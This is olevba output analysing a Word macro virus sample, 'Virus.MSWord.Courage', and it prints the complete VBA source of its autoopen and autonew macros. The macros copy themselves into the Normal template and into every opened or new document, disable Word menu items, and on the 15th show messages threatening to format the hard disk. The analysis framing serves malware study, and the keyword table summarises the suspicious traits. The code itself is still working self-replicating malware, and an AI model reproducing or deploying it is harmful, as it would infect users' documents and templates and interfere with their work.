olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Courage-d2fec5a05d84d2e3eaaa7b86c49773a002d389a4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Courage-d2fec5a05d84d2e3eaaa7b86c49773a002d389a4 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoopen.bas 
in file: Virus.MSWord.Courage-d2fec5a05d84d2e3eaaa7b86c49773a002d389a4 - OLE stream: 'Macros/VBA/autoopen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub main()


Dim normal_exist As Integer
Dim file_exist As Integer
Dim name_myfile As String
Dim path_myfile As String
Dim myfile As String
Dim path_normal As String
Dim name_normal As String
Dim normall As String
Dim dat As String
normal_exist = 0
file_exist = 0
On Error GoTo bye
dat = Day(Date)
If dat = 15 Then
b = MsgBox("今天是" + Str(Date) + "，我的病毒发作了。请问你想不想格式化你的硬盘？", vbOKCancel, "非常遗憾，你的计算机染上病毒了。")
If b = vbOK Then
MsgBox "我非常佩服你的勇气，请继续工作吧。"
Else
MsgBox "请按下确定键，格式化您的硬盘"
For i = 3 To 10
Documents.Add
ActiveDocument.SaveAs
Next i
End If
End If


CommandBars("tools").Controls(12).Enabled = False
CommandBars("tools").Controls(14).Enabled = False
CommandBars("tools").Controls(13).Enabled = False
CommandBars("view").Controls(6).Enabled = False

path_normal = Options.DefaultFilePath(Path:=wdUserTemplatesPath)
path_myfile = ActiveDocument.Path
name_normal = NormalTemplate
normall = path_normal + "\" + name_normal
name_myfile = ActiveDocument.Name
myfile = path_myfile + "\" + name_myfile

all = ActiveDocument.VBProject.VBComponents.count
For i = 1 To all
If ActiveDocument.VBProject.VBComponents.Item(i).Name = "autoexec" Then
file_exist = 1
End If
Next i


If file_exist = 0 Then

For Each Item In ActiveDocument.VBProject.VBComponents
temp = Item.Name
If temp = "autoopen" Then

Application.OrganizerDelete myfile, "autoopen", wdOrganizerObjectProjectItems
End If
If temp = "autonew" Then
Application.OrganizerDelete myfile, "autonew", wdOrganizerObjectProjectItems
End If
Next

Application.OrganizerCopy Source:=normall, Destination:=myfile, Name:="autoopen", _
            Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=normall, Destination:=myfile, Name:="autonew", _
            Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=normall, Destination:=myfile, Name:="autoexec", _
            Object:=wdOrganizerObjectProjectItems
 ActiveDocument.Save
End If

all = NormalTemplate.VBProject.VBComponents.count
For i = 1 To all
If NormalTemplate.VBProject.VBComponents.Item(i).Name = "autoexec" Then
normal_exist = 1
End If
Next i

If normal_exist = 0 Then

For Each Item In NormalTemplate.VBProject.VBComponents
temp = Item.Name
If temp = "autoopen" Then

Application.OrganizerDelete normall, "autoopen", wdOrganizerObjectProjectItems
End If
If temp = "autonew" Then
Application.OrganizerDelete normall, "autonew", wdOrganizerObjectProjectItems
End If
Next

Application.OrganizerCopy Source:=myfile, Destination:=normall, Name:="autoopen", _
            Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=myfile, Destination:=normall, Name:="autoexec", _
            Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=myfile, Destination:=normall, Name:="autonew", _
            Object:=wdOrganizerObjectProjectItems
NormalTemplate.Save

End If


bye:




End Sub
  










-------------------------------------------------------------------------------
VBA MACRO autonew.bas 
in file: Virus.MSWord.Courage-d2fec5a05d84d2e3eaaa7b86c49773a002d389a4 - OLE stream: 'Macros/VBA/autonew'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub main()


Dim normal_exist As Integer
Dim file_exist As Integer
Dim name_myfile As String
Dim path_myfile As String
Dim myfile As String
Dim path_normal As String
Dim name_normal As String
Dim normall As String
normal_exist = 0
file_exist = 0
On Error GoTo bye


path_normal = Options.DefaultFilePath(Path:=wdUserTemplatesPath)
path_myfile = ActiveDocument.Path
name_normal = NormalTemplate
normall = path_normal + "\" + name_normal
name_myfile = ActiveDocument.Name
If path_myfile <> Null Then
myfile = path_file + "\" + name_myfile
Else
myfile = name_myfile
End If






Application.OrganizerCopy Source:=normall, Destination:=myfile, Name:="autoopen", _
            Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=normall, Destination:=myfile, Name:="autonew", _
            Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=normall, Destination:=myfile, Name:="autoexec", _
            Object:=wdOrganizerObjectProjectItems







bye:




End Sub
  














+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |autonew             |Runs when a new Word document is created     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

